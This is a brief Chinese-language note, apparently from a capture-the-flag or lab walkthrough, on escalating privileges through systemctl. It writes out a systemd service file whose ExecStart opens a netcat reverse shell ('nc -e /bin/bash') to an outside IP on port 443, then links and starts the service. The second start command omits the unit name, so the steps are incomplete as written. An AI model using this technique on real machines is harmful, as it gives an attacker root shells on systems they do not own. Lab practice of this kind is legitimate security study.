# systemctl提权

写一个rong.service文件，包含以下内容

```clike
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```

而后链接再启动

```clike
systemctl link /home/pepper/rong.service
systemctl start
```

‍
